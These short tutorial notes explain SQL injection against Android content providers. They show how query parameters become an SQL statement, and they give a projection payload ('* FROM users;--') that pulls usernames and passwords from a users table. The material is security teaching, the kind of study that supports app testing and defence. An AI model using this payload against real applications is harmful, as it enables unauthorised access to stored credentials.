___

#### SQLi on Content Providers

 - For accessing DATA applications request content provider with a query method to return cursor
 - The query method contains multiple parameters such as `Uri, projection, selection, selectionArgs, sortOrder` etc.
 - This will be made into an sql statement like this one:
```sql
 SELECT projection FROM table_name WHERE selection=selectionArgs ORDER BY   sortOrder
```

- let's take a scenario where an app is requesting for some news data :
```
Query{
Uri,            content://com.example.appp/news
projection,     Payload 
selection,      null 
selectionArgs,  null 
sortOrder,      null 
}
```

-  the sql statement for that will be: 
```sql
 SELECT projection FROM Uri WHERE null=null ORDER BY  null
```
 
-  the simplified statement will be:
```sql
SELECT projection FROM uri
```


-  here we are going to access users table instead of news to get passwords, let's see how to do that

- remember we gave the projection variable the name payload now we are substituting a real sqli payload to the statement
```
SELECT *FROM users;-- FROM uri
```

-  the statement after -- will be ignored and the query will now return us the usernames and passwords from users table.